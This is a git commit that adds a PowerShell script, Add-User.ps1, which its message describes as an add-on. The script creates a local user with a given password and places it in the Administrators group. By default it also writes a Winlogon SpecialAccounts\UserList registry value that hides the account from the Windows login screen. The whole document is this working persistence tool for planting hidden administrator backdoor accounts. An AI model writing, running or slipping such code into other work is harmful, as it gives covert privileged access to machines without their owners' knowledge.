e253681e1022cd90455e77d9b6d02b77b1de0ced
Burnd9671 <Burnd9671@gmail.com>
2018-09-23 19:54:46 -0400

    Add-User Add On
    Adds a hidden user unless the -NoHide is specified.

---
+++ Add-User.ps1
@@ -0,0 +1,41 @@
+﻿function Add-User {
+        [CmdletBinding(DefaultParameterSetName="Hidden")]
+        Param(
+            [Parameter(Mandatory=$True)]
+            [String]$Username,
+
+            [Parameter(Mandatory=$True)]
+            [String]$Password,
+
+            [Parameter(ParameterSetName="Hidden")]
+            [Switch]$Hidden,
+
+            [Parameter(ParameterSetName="NotHidden")]
+            [Switch]$NoHide
+            )
+
+        Switch ($PsCmdlet.ParameterSetName){
+            "Hidden"     { $Hidden = $True }
+            "NoHide"     { $Hidden = $False }
+            }
+
+        $regPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts"
+
+        If ($PSVersionTable.PSVersion -lt "5.1"){
+            Net User $Username $Password /Add | Out-Null
+            Net Localgroup "Administrators" $Username /Add | Out-Null
+            If ($Hidden -eq $False){ Exit }
+            Reg Add "HKLM\$regPath\UserList" /v $Username /t REG_DWORD /d "0" /f | Out-Null
+            }
+        Else {
+            $secPW = ConvertTo-SecureString -String $Password -AsPlainText -Force
+            New-LocalUser -Name $Username -Password $secPw -PasswordNeverExpires -AccountNeverExpires | Out-Null
+            Add-LocalGroupMember -Group "Administrators" -Member $Username | Out-Null
+            If ($Hidden -eq $False){ Exit }
+            If ( $(Test-Path -Path "HKLM:\$regPath\UserList") -eq $False ){
+                New-Item -Path "HKLM:\$regPath" -Name "UserList" -Force | Out-Null
+                }
+            New-ItemProperty -Path "HKLM:\$regPath\UserList" -Name $Username -PropertyType "DWORD" -Value "0" -Force | Out-Null
+            }
+}
+            
